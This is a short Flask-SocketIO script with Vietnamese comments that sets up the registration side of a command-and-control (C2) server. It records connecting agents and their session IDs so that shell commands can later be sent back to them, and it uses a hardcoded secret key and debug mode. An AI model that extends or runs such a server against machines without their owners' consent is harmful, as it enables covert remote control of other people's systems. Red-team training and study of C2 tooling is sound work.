from flask import Flask, request
from flask_socketio import SocketIO, emit

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!' 
socketio = SocketIO(app)

# bo nho tam thoi (RAM)
# agents = { "uuid": { "info": {...}, "sid": "session_id_xyz" } }
agents = {}

@socketio.on('connect')
def handle_connect():
    print(f"[+] Client connected: {request.sid}")

@socketio.on('register')
def handle_register(data):
    # data là JSON do agent gui len: {"agent_id": "...", "hostname": "..."}
    agent_id = data.get('agent_id')
    
    if agent_id:
        # luu session id moi nhat de co the gui lenh nguoc lai (interactive shell)
        current_sid = request.sid
        
        # cap nhat thong tin vao bo nho
        agents[agent_id] = {
            "info": data,
            "sid": current_sid, 
            "status": "online"
        }
        
        print(f"[*] Agent Registered: {agent_id} | Host: {data.get('hostname')} | SID: {current_sid}")
        
        # gui tin hieu xac nhan cho agent: "ok, server da xac nhan"
        emit('server_ack', {'status': 'registered', 'message': 'Welcome to C2'})

if __name__ == '__main__':
    print("[*] Starting C2 Server with WebSockets...")
    socketio.run(app, port=80, debug=True)